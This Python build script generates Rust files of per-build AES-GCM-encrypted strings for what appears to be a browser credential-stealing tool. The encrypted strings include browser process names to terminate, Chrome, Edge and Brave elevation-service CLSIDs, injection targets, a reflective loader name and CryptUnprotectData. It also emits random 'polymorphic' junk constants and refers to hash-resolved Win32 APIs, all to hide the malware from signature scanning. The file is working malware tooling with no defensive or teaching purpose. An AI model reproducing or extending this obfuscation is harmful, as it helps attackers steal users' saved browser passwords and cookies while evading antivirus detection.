#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import random
from datetime import datetime

from Crypto.Cipher import AES


def aes256gcm_encrypt(plaintext: bytes, key: bytes) -> tuple:
    nonce = os.urandom(12)
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    ciphertext, tag = cipher.encrypt_and_digest(plaintext)
    return ciphertext + tag, nonce


def format_const_array(name: str, data: bytes, pub: bool = False) -> str:
    hex_bytes = ", ".join(f"0x{b:02X}" for b in data)
    prefix = "pub " if pub else ""
    return f"{prefix}static {name}: [u8; {len(data)}] = [{hex_bytes}];"


def format_const_slice(name: str, data: bytes, pub: bool = False) -> str:
    hex_bytes = ", ".join(f"0x{b:02X}" for b in data)
    prefix = "pub " if pub else ""
    return f"{prefix}static {name}: &[u8] = &[{hex_bytes}];"


def generate_kill_strings() -> list:
    # Only browser/helper exe names remain here; Win32 API names are now
    # resolved by hash (api_hash.rs) — no strings needed.
    strings = [
        ("KILL_CHROME", "chrome.exe"),
        ("KILL_EDGE", "msedge.exe"),
        ("KILL_BRAVE", "brave.exe"),
        ("KILL_VIVALDI", "vivaldi.exe"),
        ("KILL_OPERA", "opera.exe"),
        ("KILL_FIREFOX", "firefox.exe"),
        ("KILL_WATERFOX", "waterfox.exe"),
        ("KILL_LIBREWOLF", "librewolf.exe"),
        ("KILL_YANDEX", "yandex.exe"),
        ("KILL_BROWSER", "browser.exe"),
        ("KILL_CHROMEDRIVER", "chromedriver.exe"),
        ("KILL_GOOGLEUPDATE", "googleupdate.exe"),
        ("KILL_CRASHHANDLER", "crashpad_handler.exe"),
        ("KILL_CRASHPAD", "crashpad.exe"),
        ("KILL_BROWSER_BLPOP", "browser_broker.exe"),
        ("KILL_MSEDGE_UPDATE", "microsoftedgeupdate.exe"),
        ("KILL_BRAVE_UPDATE", "braveupdate.exe"),
        ("KILL_OPERA_UPDATE", "operaupdate.exe"),
        ("KILL_PLUGIN_CONTAINER", "plugin-container.exe"),
        ("KILL_PLUGIN_CONTAINER64", "plugin-container64.exe"),
        ("KILL_UPDATER", "updater.exe"),
    ]
    result = []
    for name, plaintext in strings:
        key = os.urandom(32)
        ct, nonce = aes256gcm_encrypt(plaintext.encode('utf-8'), key)
        result.append((name, key, nonce, ct))
    return result


def generate_lib_strings() -> list:
    strings = [
        ("LIB_K32", "kernel32.dll"),
        ("RESULT_ENV", "CHROME_RECOVERY_RESULT"),
        ("USER_DATA_ENV", "CHROME_RECOVERY_USER_DATA_REL"),
        ("DATA_ROOT_ENV", "CHROME_RECOVERY_DATA_ROOT"),
        ("BROWSER_NAME_ENV", "CHROME_RECOVERY_BROWSER_NAME"),
        ("BROWSER_CLSID_ENV", "CHROME_RECOVERY_CLSID"),
        ("OPEN_PROC", "OpenProcess"),
        ("TERM_PROC", "TerminateProcess"),
        ("CLOSE_H", "CloseHandle"),
        ("CTX_SNAP", "CreateToolhelp32Snapshot"),
        ("P32_FIRST", "Process32FirstW"),
        ("P32_NEXT", "Process32NextW"),
        ("RL", "ReflectiveLoader"),
        # Browser exe names used in inject/src/browsers.rs and lib.rs
        ("INJ_CHROME_EXE",  "chrome.exe"),
        ("INJ_EDGE_EXE",    "msedge.exe"),
        ("INJ_BRAVE_EXE",   "brave.exe"),
        ("INJ_VIVALDI_EXE", "vivaldi.exe"),
        ("INJ_OPERA_EXE",   "opera.exe"),
        ("INJ_BROWSER_EXE", "browser.exe"),
        # CLSID strings used in inject/src/browsers.rs
        ("INJ_CLSID_CHROME",        "{708860E0-F641-4611-8895-7D867DD3675B}"),
        ("INJ_CLSID_CHROME_BETA",   "{DD2646BA-3707-4BF8-B9A7-038691A68FC2}"),
        ("INJ_CLSID_CHROME_DEV",    "{DA7FDCA5-2CAA-4637-AA17-0740584DE7DA}"),
        ("INJ_CLSID_CHROME_CANARY", "{704C2872-2049-435E-A469-0A534313C42B}"),
        ("INJ_CLSID_EDGE",          "{1FCBE96C-1697-43AF-9140-2897C7C69767}"),
        ("INJ_CLSID_BRAVE",         "{576B31AF-6369-4B6B-8560-E4B203A97A8B}"),
        # Common browser path fragments
        ("INJ_PATH_LOCALAPPDATA", "LOCALAPPDATA"),
        ("INJ_PATH_APPDATA",      "APPDATA"),
        ("INJ_PATH_PROGRAMFILES", "ProgramFiles"),
        ("INJ_PATH_PF86",         "ProgramFiles(x86)"),
        ("INJ_PATH_CHROME_APP",   r"Google\Chrome\Application\chrome.exe"),
        ("INJ_PATH_EDGE_APP",     r"Microsoft\Edge\Application\msedge.exe"),
        ("INJ_PATH_BRAVE_APP",    r"BraveSoftware\Brave-Browser\Application\brave.exe"),
        ("INJ_PATH_VIVALDI_APP",  r"Vivaldi\Application\vivaldi.exe"),
        ("INJ_PATH_OPERA_APP",    r"Programs\Opera\opera.exe"),
        ("INJ_PATH_YANDEX_APP",   r"Yandex\YandexBrowser\Application\browser.exe"),
    ]
    result = []
    for name, plaintext in strings:
        key = os.urandom(32)
        ct, nonce = aes256gcm_encrypt(plaintext.encode('utf-8'), key)
        result.append((name, key, nonce, ct))
    return result


def generate_elev_strings() -> list:
    # All Win32 API and DLL names are now resolved by hash (api_hash.rs).
    # This function is kept for structural compatibility but returns nothing.
    return []


def generate_api_aes_constants() -> list:
    """Return list of (const_name, key, nonce, ciphertext) for api.rs — AES-256-GCM."""
    strings = [
        ("CRYPTUNPROTECTDATA_ENC", b"CryptUnprotectData"),
        ("LOCALFREE_ENC",          b"LocalFree"),
        ("GETTICKCOUNT64_ENC",     b"GetTickCount64"),
        ("GETSYSTEMINFO_ENC",      b"GetSystemInfo"),
        ("GLOBALMEMORYSTATUSEX_ENC", b"GlobalMemoryStatusEx"),
        ("LOADLIBRARYW_ENC",       b"LoadLibraryW"),
        ("MESSAGEBOXW_ENC",        b"MessageBoxW"),
        ("GETSYSTEMMETRICS_ENC",   b"GetSystemMetrics"),
        ("CRYPT32_DLL_ENC",        b"crypt32.dll"),
        ("KERNEL32_DLL_ENC",       b"kernel32.dll"),
        ("USER32_DLL_ENC",         b"user32.dll"),
    ]
    result = []
    for name, plaintext in strings:
        key = os.urandom(32)
        ct, nonce = aes256gcm_encrypt(plaintext, key)
        result.append((name, key, nonce, ct))
    return result


# Use int type alias for clarity
u8 = int


def generate_polymorphic_keys(output_dir: str):
    os.makedirs(output_dir, exist_ok=True)

    inject_dir = os.path.join(output_dir, "inject", "src")
    os.makedirs(inject_dir, exist_ok=True)

    kill_strings = generate_kill_strings()
    lib_strings = generate_lib_strings()
    elev_strings = generate_elev_strings()

    # Per-build AES-256-GCM constants for api.rs (replaces rolling-XOR)
    api_constants = generate_api_aes_constants()

    # Per-build random junk constants (replace obvious magic numbers)
    junk_a = random.randint(0x10000000, 0xEFFFFFFF)
    junk_b = random.randint(0x10000000, 0xEFFFFFFF)
    junk_magic = random.randint(0x1000, 0xEFFF)
    junk_xor_const = random.randint(0xC0, 0xFE)
    junk_mul_big = random.randint(0x40000000, 0x7FFFFF00) | 1
    junk_large_xor = random.randint(0x1000000000, 0xEFFFFFFFFFFF)

    lines = []
    lines.append("// AUTO-GENERATED by build.py - DO NOT EDIT")
    lines.append(f"// Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(f"// AES-256-GCM encrypted strings - unique per build")
    lines.append("")
    lines.append("#![allow(dead_code, non_upper_case_globals)]")
    lines.append("")
    lines.append("use aes_gcm::{aead::Aead, KeyInit, Aes256Gcm, Nonce};")
    lines.append("")

    lines.append("// ===== kill.rs strings =====")
    for name, key, nonce, ct in kill_strings:
        lines.append(format_const_array(f"{name}_KEY", key, pub=True))
        lines.append(format_const_array(f"{name}_NONCE", nonce, pub=True))
        lines.append(format_const_slice(f"{name}_ENC", ct, pub=True))
    lines.append("")

    lines.append("// ===== lib.rs strings (for inject crate) =====")
    for name, key, nonce, ct in lib_strings:
        lines.append(format_const_array(f"{name}_KEY", key, pub=True))
        lines.append(format_const_array(f"{name}_NONCE", nonce, pub=True))
        lines.append(format_const_slice(f"{name}_ENC", ct, pub=True))
    lines.append("")

    lines.append("// ===== elev.rs strings =====")
    for name, key, nonce, ct in elev_strings:
        lines.append(format_const_array(f"{name}_KEY", key, pub=True))
        lines.append(format_const_array(f"{name}_NONCE", nonce, pub=True))
        lines.append(format_const_slice(f"{name}_ENC", ct, pub=True))
    lines.append("")

    # Emit AES-256-GCM constants for api.rs (replaces rolling-XOR)
    lines.append("// ===== api.rs AES-256-GCM string constants =====")
    for name, key, nonce, ct in api_constants:
        lines.append(format_const_array(f"{name}_KEY", key, pub=True))
        lines.append(format_const_array(f"{name}_NONCE", nonce, pub=True))
        lines.append(format_const_slice(f"{name}_CT", ct, pub=True))
    lines.append("")

    # Emit junk constants (randomized per build)
    lines.append("// ===== junk.rs per-build magic constants =====")
    lines.append(f"pub const JUNK_A: u32 = 0x{junk_a:08X};")
    lines.append(f"pub const JUNK_B: u32 = 0x{junk_b:08X};")
    lines.append(f"pub const JUNK_MAGIC: u32 = 0x{junk_magic:04X};")
    lines.append(f"pub const JUNK_XOR_CONST: u8 = 0x{junk_xor_const:02X};")
    lines.append(f"pub const JUNK_MUL_BIG: u64 = 0x{junk_mul_big:016X};")
    lines.append(f"pub const JUNK_LARGE_XOR: u64 = 0x{junk_large_xor:016X};")
    lines.append("")

    lines.append("// ===== AES decrypt functions =====")
    lines.append("pub fn aes_decrypt(encoded: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {")
    lines.append("    let cipher = Aes256Gcm::new_from_slice(key).unwrap();")
    lines.append("    let n = Nonce::from_slice(nonce);")
    lines.append("    cipher.decrypt(n, encoded).unwrap_or_default()")
    lines.append("}")
    lines.append("")
    lines.append("pub fn aes_to_cstring(encoded: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> std::ffi::CString {")
    lines.append("    let decoded = aes_decrypt(encoded, key, nonce);")
    lines.append("    unsafe { std::ffi::CString::from_vec_unchecked(decoded) }")
    lines.append("}")
    lines.append("")
    lines.append("pub fn aes_decode_stack(encoded: &[u8], key: &[u8; 32], nonce: &[u8; 12], buf: &mut [u8; 256]) -> usize {")
    lines.append("    let decoded = aes_decrypt(encoded, key, nonce);")
    lines.append("    let len = decoded.len().min(255);")
    lines.append("    buf[..len].copy_from_slice(&decoded[..len]);")
    lines.append("    buf[len] = 0;")
    lines.append("    len")
    lines.append("}")

    output_path = os.path.join(output_dir, "polymorphic_keys.rs")
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write('\n'.join(lines))
        f.write('\n')

    inject_lines = []
    inject_lines.append("// AUTO-GENERATED by build.py - DO NOT EDIT")
    inject_lines.append(f"// Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    inject_lines.append(f"// AES-256-GCM encrypted strings - unique per build")
    inject_lines.append("")
    inject_lines.append("#![allow(dead_code, non_upper_case_globals)]")
    inject_lines.append("")
    inject_lines.append("use aes_gcm::{aead::Aead, KeyInit, Aes256Gcm, Nonce};")
    inject_lines.append("")

    inject_lines.append("// ===== lib.rs strings =====")
    for name, key, nonce, ct in lib_strings:
        inject_lines.append(format_const_array(f"{name}_KEY", key, pub=True))
        inject_lines.append(format_const_array(f"{name}_NONCE", nonce, pub=True))
        inject_lines.append(format_const_slice(f"{name}_ENC", ct, pub=True))
    inject_lines.append("")

    inject_lines.append("// ===== AES decrypt functions =====")
    inject_lines.append("pub fn aes_decrypt(encoded: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {")
    inject_lines.append("    let cipher = Aes256Gcm::new_from_slice(key).unwrap();")
    inject_lines.append("    let n = Nonce::from_slice(nonce);")
    inject_lines.append("    cipher.decrypt(n, encoded).unwrap_or_default()")
    inject_lines.append("}")
    inject_lines.append("")
    inject_lines.append("pub fn aes_to_cstring(encoded: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> std::ffi::CString {")
    inject_lines.append("    let decoded = aes_decrypt(encoded, key, nonce);")
    inject_lines.append("    unsafe { std::ffi::CString::from_vec_unchecked(decoded) }")
    inject_lines.append("}")

    inject_output_path = os.path.join(inject_dir, "polymorphic_keys.rs")
    with open(inject_output_path, 'w', encoding='utf-8') as f:
        f.write('\n'.join(inject_lines))
        f.write('\n')

    print(f"[OK] Generated {output_path}")
    print(f"[OK] Generated {inject_output_path}")

    return 0, 0, 0


if __name__ == "__main__":
    project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    src_dir = os.path.join(project_root, "src")
    generate_polymorphic_keys(src_dir)
